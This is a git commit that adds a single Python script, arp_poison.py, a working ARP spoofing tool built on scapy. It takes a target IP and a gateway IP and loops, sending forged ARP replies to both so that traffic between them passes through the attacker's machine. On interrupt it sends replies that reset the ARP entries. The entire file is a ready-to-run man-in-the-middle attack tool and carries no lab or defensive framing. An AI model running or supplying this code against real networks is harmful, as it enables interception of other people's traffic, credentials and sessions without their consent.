6e47edaa557b665dca4de99a5975206516d9cc89
Diego Espejo <100853421+Spiegelin@users.noreply.github.com>
2024-01-21 15:51:24 -0600

    Add files

---
+++ arp_poison.py
@@ -0,0 +1,68 @@
+import scapy.all as scapy
+import time
+import optparse
+
+
+def get_mac_address(ip):
+    arp_request_packet = scapy.ARP(pdst=ip)
+    broadcast_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    combined_packet = broadcast_packet/arp_request_packet
+    answer_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]
+
+    # Return MAC Address
+    return answer_list[0][1].hwsrc
+
+
+def arp_poisoning(target_ip, poisoned_ip):
+    target_mac = get_mac_address(target_ip)
+
+    arp_response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=poisoned_ip)
+    scapy.send(arp_response, verbose=False)
+
+
+def reset_operation(fooled_ip, gateway_ip):
+    fooled_mac = get_mac_address(fooled_ip)
+    gateway_mac = get_mac_address(gateway_ip)
+
+    arp_response = scapy.ARP(op=2, pdst=fooled_ip, hwdst=fooled_mac, psrc=gateway_ip, hwsrc=gateway_mac)
+    scapy.send(arp_response, verbose=False)
+
+
+
+def get_user_input():
+    parse_object = optparse.OptionParser()
+
+    parse_object.add_option("-t", "--target", dest="target_ip", help="Enter Target IP")
+    parse_object.add_option("-g", "--gateway", dest="gateway_ip", help="Enter Gateway IP")
+
+    options = parse_object.parse_args()[0]
+
+    if not options.target_ip:
+        print("Enter Target IP")
+
+    if not options.gateway_ip:
+        print("Enter Gateway IP")
+
+    return options
+
+
+# Getting ips
+user_ips = get_user_input()
+user_target_ip = user_ips.target_ip
+user_gateway_ip = user_ips.gateway_ip
+
+try:
+    number = 0
+    while True:
+        arp_poisoning(user_target_ip, user_gateway_ip)
+        arp_poisoning(user_gateway_ip, user_target_ip)
+
+        number += 1
+
+        print("\rSending packets " + str(number), end="")
+
+        time.sleep(3)
+except KeyboardInterrupt:
+    print("\nQuitting & Resetting operation")
+    reset_operation(user_target_ip, user_gateway_ip)
+    reset_operation(user_gateway_ip, user_target_ip)
